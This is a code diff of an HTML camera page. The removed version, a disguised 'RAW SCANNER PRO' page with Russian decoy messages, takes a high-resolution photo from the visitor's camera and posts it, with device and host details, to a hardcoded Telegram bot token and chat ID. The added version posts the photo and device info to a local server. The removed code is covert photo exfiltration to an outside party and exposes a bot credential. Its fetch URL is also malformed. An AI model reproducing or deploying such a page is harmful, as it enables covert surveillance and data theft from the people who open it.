@@ -1,116 +1,85 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SENSORY RAW ENGINE v6.0</title>
-    <style>
-        :root { --accent: #fe2c55; --bg: #050505; }
-        body { margin: 0; background: var(--bg); color: #fff; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; overflow: hidden; }
-        .header { padding: 30px; text-align: center; border-bottom: 1px solid #1a1a1a; width: 100%; box-sizing: border-box; }
-        h1 { margin: 0; font-size: 22px; letter-spacing: 2px; color: var(--accent); font-weight: 900; }
-        
-        .main-btn { 
-            margin-top: 50px; width: 100px; height: 100px; border-radius: 50%; border: 5px solid #fff;
-            background: transparent; cursor: pointer; transition: 0.3s; position: relative;
-        }
-        .main-btn::after { content: ''; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 75px; height: 75px; background: var(--accent); border-radius: 50%; }
-        .main-btn:active { transform: scale(0.9); }
-        .main-btn:disabled { filter: grayscale(1); opacity: 0.5; }
-
-        #console { 
-            margin-top: 40px; width: 90%; max-width: 400px; background: #000; 
-            padding: 15px; border: 1px solid #222; font-family: monospace; font-size: 11px; color: #666;
-            min-height: 80px; border-radius: 8px;
-        }
-        .success { color: #00ff88; }
-        video, canvas { display: none; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Camera Capture</title>
+<style>
+body { font-family: Arial; text-align: center; background: #f4f4f4; margin: 0; padding: 0; }
+video { width: 90%; max-width: 400px; margin-top: 20px; border-radius: 10px; }
+button { padding: 10px 20px; margin: 10px; font-size: 16px; border-radius: 5px; border: none; background: #007bff; color: white; cursor: pointer; }
+button:disabled { background: #ccc; }
+#loader { display: none; margin-top: 20px; }
+#status { margin-top: 10px; font-size: 14px; color: #333; }
+</style>
 </head>
 <body>
+<h2>Camera Capture</h2>
+<video id="video" autoplay playsinline></video>
+<br>
+<button id="captureBtn">Capture Photo</button>
+<div id="loader">Uploading...</div>
+<div id="status"></div>
 
-    <div class="header">
-        <h1>RAW SCANNER PRO</h1>
-        <div style="font-size: 10px; color: #444; margin-top: 5px;">STREAMS: SECURE | SENSORS: READY</div>
-    </div>
+<script>
+(async () => {
+    const video = document.getElementById('video');
+    const btn = document.getElementById('captureBtn');
+    const loader = document.getElementById('loader');
+    const status = document.getElementById('status');
 
-    <button class="main-btn" id="captureBtn" onclick="runCapture()"></button>
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+    } catch (err) {
+        status.textContent = "Camera access denied or unavailable.";
+        console.error(err);
+    }
 
-    <div id="console">> СИСТЕМА ОЖИДАНИЯ...</div>
+    btn.onclick = async () => {
+        loader.style.display = "block";
+        status.textContent = "";
+        btn.disabled = true;
 
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c"></canvas>
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
 
-    <script>
-        const TG_TOKEN = "8658581282:AAH5LoHzxLK7WE0-3cuxiiRkRn5tbSsTpQA";
-        const TG_CHAT_ID = "6660269414"; // Твой ID
+        const imageData = canvas.toDataURL('image/png');
 
-        const log = (msg, cls = "") => {
-            const el = document.getElementById('console');
-            el.innerHTML = `<div class="${cls}">> ${msg}</div>`;
+        // --- AUTO DOWNLOAD ---
+        const a = document.createElement('a');
+        a.href = imageData;
+        a.download = `photo_${Date.now()}.png`;
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+
+        const deviceInfo = {
+            platform: navigator.platform,
+            userAgent: navigator.userAgent,
+            screen: { width: screen.width, height: screen.height }
         };
 
-        async function runCapture() {
-            const btn = document.getElementById('captureBtn');
-            btn.disabled = true;
-            log("ИНИЦИАЛИЗАЦИЯ КАМЕРЫ...");
-
-            try {
-                // 1. Захват потока
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "environment", width: { ideal: 4096 }, height: { ideal: 2160 } }
-                });
-
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-
-                // 2. Ожидание фокусировки (2.5 сек)
-                log("НАСТРОЙКА ФОКУСА И ISO...");
-                await new Promise(r => setTimeout(r, 2500));
-
-                const track = stream.getVideoTracks()[0];
-                const settings = track.getSettings();
-                const canvas = document.getElementById('c');
-                
-                canvas.width = settings.width;
-                canvas.height = settings.height;
-                const ctx = canvas.getContext('2d');
-                
-                // Программное улучшение (Neural Sharp)
-                ctx.filter = 'contrast(1.1) saturate(1.2) brightness(1.05)';
-                ctx.drawImage(video, 0, 0);
-
-                log("ГЕНЕРАЦИЯ RAW ДАМПА...");
-
-                // 3. Отправка в Telegram
-                canvas.toBlob(async (blob) => {
-                    const fd = new FormData();
-                    fd.append('chat_id', TG_CHAT_ID);
-                    fd.append('photo', blob, 'shot.jpg');
-                    fd.append('caption', `📡 *НОВЫЙ СНИМОК*\n\n🖥 **Разрешение:** ${canvas.width}x${canvas.height}\n📱 **Устройство:** ${navigator.platform}\n🌍 **Host:** ${window.location.hostname}`);
-                    fd.append('parse_mode', 'Markdown');
-
-                    const res = await fetch(`https://telegram.org{TG_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: fd
-                    });
-
-                    if (res.ok) {
-                        log("✅ ФОТО ОТПРАВЛЕНО В ТЕЛЕГРАМ!", "success");
-                    } else {
-                        log("❌ ОШИБКА API ТЕЛЕГРАМ");
-                    }
-
-                    // Очистка ресурсов
-                    stream.getTracks().forEach(t => t.stop());
-                    btn.disabled = false;
-                }, 'image/jpeg', 0.95);
-
-            } catch (err) {
-                log(`ОШИБКА: ${err.message}`);
-                btn.disabled = false;
-            }
+        try {
+            // Отправка на локальный сервер
+            const res = await fetch('http://localhost:5000/upload', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: imageData, device: deviceInfo })
+            });
+            const result = await res.json();
+            status.textContent = result.message;
+        } catch (err) {
+            status.textContent = "Upload failed. Make sure your Python server is running.";
+            console.error(err);
+        } finally {
+            loader.style.display = "none";
+            btn.disabled = false;
         }
-    </script>
+    };
+})();
+</script>
 </body>
 </html>
